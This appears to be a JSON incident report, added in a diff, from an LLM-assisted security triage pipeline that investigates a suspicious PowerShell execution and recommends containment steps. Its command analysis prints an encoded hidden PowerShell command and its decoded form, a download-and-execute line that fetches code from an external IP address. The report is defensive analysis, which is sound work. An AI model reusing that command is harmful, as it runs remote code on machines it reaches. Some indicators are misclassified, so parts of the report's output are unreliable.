@@ -1,0 +1,195 @@
+{
+  "report_id": "ed6470a0-9bb4-46ea-8fc3-544b4c8a44d3",
+  "alert_id": "24898897-d412-53fe-a2a8-5073ee119e11",
+  "generated_at": "2026-08-15T09:37:16.095112Z",
+  "alert_summary": "A highly suspicious PowerShell script was executed from an unknown IP address, downloading and running a potentially malicious payload. This activity is strongly indicative of compromise or attempted data exfiltration.",
+  "investigation_timeline": [
+    {
+      "step_name": "ingest_and_parse",
+      "action": "completed",
+      "tool_used": null,
+      "input": null,
+      "output_summary": "alert 24898897-d412-53fe-a2a8-5073ee119e11 ingested; model available: True",
+      "timestamp": "2026-08-15T09:37:02.790657Z"
+    },
+    {
+      "step_name": "extract_indicators",
+      "action": "completed",
+      "tool_used": "regex_extraction+llm_extraction",
+      "input": null,
+      "output_summary": "regex: 15 candidates, 6 validated; command decode: 1 segment(s) decoded, 0 discarded; LLM: 3 candidates, 1 validated",
+      "timestamp": "2026-08-15T09:37:05.066237Z"
+    },
+    {
+      "step_name": "enrich",
+      "action": "completed",
+      "tool_used": "enrichment_registry",
+      "input": null,
+      "output_summary": "enriched 6 indicator(s)",
+      "timestamp": "2026-08-15T09:37:05.066333Z"
+    },
+    {
+      "step_name": "gather_context",
+      "action": "completed",
+      "tool_used": "siem_connector",
+      "input": null,
+      "output_summary": "gathered context for agent 000, rule 100075",
+      "timestamp": "2026-08-15T09:37:05.476386Z"
+    },
+    {
+      "step_name": "correlate",
+      "action": "completed",
+      "tool_used": "siem_connector+llm",
+      "input": null,
+      "output_summary": "pattern_type=brute_force, evidence_count=55; follow-up same_rule_id_host added 27",
+      "timestamp": "2026-08-15T09:37:06.000266Z"
+    },
+    {
+      "step_name": "risk_assessment",
+      "action": "completed",
+      "tool_used": "llm",
+      "input": null,
+      "output_summary": "severity=high, confidence=high",
+      "timestamp": "2026-08-15T09:37:06.994299Z"
+    },
+    {
+      "step_name": "draft_report",
+      "action": "completed",
+      "tool_used": "llm",
+      "input": null,
+      "output_summary": "draft-A: 13 action(s) selected; draft-B: experimental triage=true_positive",
+      "timestamp": "2026-08-15T09:37:11.620985Z"
+    },
+    {
+      "step_name": "self_check",
+      "action": "completed",
+      "tool_used": "llm",
+      "input": null,
+      "output_summary": "audited 15 claim(s), 0 flagged",
+      "timestamp": "2026-08-15T09:37:16.095001Z"
+    },
+    {
+      "step_name": "finalize_and_persist",
+      "action": "completed",
+      "tool_used": "alert_store",
+      "input": null,
+      "output_summary": "report ed6470a0-9bb4-46ea-8fc3-544b4c8a44d3 persisted, alert marked investigated",
+      "timestamp": "2026-08-15T09:37:16.103904Z"
+    }
+  ],
+  "enrichment_findings": [
+    {
+      "indicator_type": "domain",
+      "indicator_value": "dev-klyam01.victimcorp.com",
+      "provider_id": "none",
+      "queried_at": "2026-08-15T09:37:05.066273Z",
+      "verdict": "unknown",
+      "score": 0.0,
+      "raw_response": {},
+      "cache_expires_at": "2026-08-15T09:37:05.066273Z",
+      "error": "no_provider_registered"
+    },
+    {
+      "indicator_type": "domain",
+      "indicator_value": "ke.li.yam",
+      "provider_id": "none",
+      "queried_at": "2026-08-15T09:37:05.066295Z",
+      "verdict": "unknown",
+      "score": 0.0,
+      "raw_response": {},
+      "cache_expires_at": "2026-08-15T09:37:05.066295Z",
+      "error": "no_provider_registered"
+    },
+    {
+      "indicator_type": "domain",
+      "indicator_value": "build-helper.js",
+      "provider_id": "none",
+      "queried_at": "2026-08-15T09:37:05.066303Z",
+      "verdict": "unknown",
+      "score": 0.0,
+      "raw_response": {},
+      "cache_expires_at": "2026-08-15T09:37:05.066303Z",
+      "error": "no_provider_registered"
+    },
+    {
+      "indicator_type": "url",
+      "indicator_value": "http://45.146.164.110:8080/u",
+      "provider_id": "none",
+      "queried_at": "2026-08-15T09:37:05.066308Z",
+      "verdict": "unknown",
+      "score": 0.0,
+      "raw_response": {},
+      "cache_expires_at": "2026-08-15T09:37:05.066308Z",
+      "error": "no_provider_registered"
+    },
+    {
+      "indicator_type": "ip",
+      "indicator_value": "45.146.164.110",
+      "provider_id": "none",
+      "queried_at": "2026-08-15T09:37:05.066324Z",
+      "verdict": "unknown",
+      "score": 0.0,
+      "raw_response": {},
+      "cache_expires_at": "2026-08-15T09:37:05.066324Z",
+      "error": "no_provider_registered"
+    },
+    {
+      "indicator_type": "domain",
+      "indicator_value": "net.webclient",
+      "provider_id": "none",
+      "queried_at": "2026-08-15T09:37:05.066328Z",
+      "verdict": "unknown",
+      "score": 0.0,
+      "raw_response": {},
+      "cache_expires_at": "2026-08-15T09:37:05.066328Z",
+      "error": "no_provider_registered"
+    }
+  ],
+  "risk_assessment": {
+    "severity": "high",
+    "confidence": "high",
+    "rationale": "The use of encoded PowerShell with obfuscation to fetch data from an external server demonstrates deliberate evasion techniques commonly seen in targeted attacks. The presence of multiple indicators—such as the unusual parent-child process chain, non-standard execution path, and connection to a suspicious IP—significantly raises the risk level. Combined with evidence of brute-force patterns and hidden command segments, this warrants immediate containment and investigation."
+  },
+  "recommended_actions": [
+    "Disable or reset credentials for the affected user account",
+    "Block the source IP at the network perimeter",
+    "Isolate the affected host from the network pending investigation",
+    "Escalate to the incident response / Tier 2 team",
+    "Review authentication logs for this account over a wider time window",
+    "Verify whether the source IP/user is a known, expected service account or automation",
+    "Run an antivirus/EDR scan on the affected host",
+    "Preserve logs and evidence for the affected host pending further investigation",
+    "Notify the asset owner of the affected host or agent",
+    "Review firewall/network segmentation rules for the affected subnet",
+    "Correlate this indicator against the wider environment beyond this alert's time window",
+    "Terminate the suspicious process on the affected host",
+    "Manually review the decoded command payload for malicious intent"
+  ],
+  "recommended_actions_freeform_experimental": [
+    "Conduct an immediate network-wide scan to detect any outbound connections originating from internal hosts toward the suspicious IP address (45.146.164.110) and its associated subnets.",
+    "Perform a thorough forensic review of all systems that executed or interacted with the PowerShell script, focusing on process creation logs, scheduled tasks, and registry modifications to identify persistence mechanisms.",
+    "Isolate any endpoints showing signs of compromise from production networks while collecting volatile memory for deeper analysis.",
+    "Engage incident response teams to correlate this activity with other observed indicators (e.g., unusual user logins, file anomalies) across the environment.",
+    "Update endpoint detection and response signatures based on the decoded PowerShell payload and associated network traffic patterns."
+  ],
+  "triage_verdict_experimental": "true_positive",
+  "triage_rationale_experimental": "The combination of obfuscated script execution, use of a hidden command chain, and communication with an external IP address strongly suggests malicious intent rather than benign activity.",
+  "uncertainty_notes": "6 enrichment lookup(s) errored or returned unknown verdicts",
+  "status": "complete",
+  "model_metadata": {
+    "model_name": "lfm2:24b-a2b-bench-ctx8k",
+    "model_version": "none",
+    "prompt_version": "4d-v1"
+  },
+  "command_analysis": {
+    "command_line": "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AMQA0ADYALgAxADYANAAuADEAMQAwADoAOAAwADgAMAAvAHUAJwApAA==",
+    "parent_command_line": "\"C:\\Windows\\System32\\wscript.exe\" \"C:\\Users\\ke.li.yam\\Downloads\\build-helper.js\"",
+    "decoded_segments": [
+      {
+        "encoding": "powershell_encoded",
+        "original": "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AMQA0ADYALgAxADYANAAuADEAMQAwADoAOAAwADgAMAAvAHUAJwApAA==",
+        "decoded": "IEX (New-Object Net.WebClient).DownloadString('http://45.146.164.110:8080/u')"
+      }
+    ]
+  }
+}
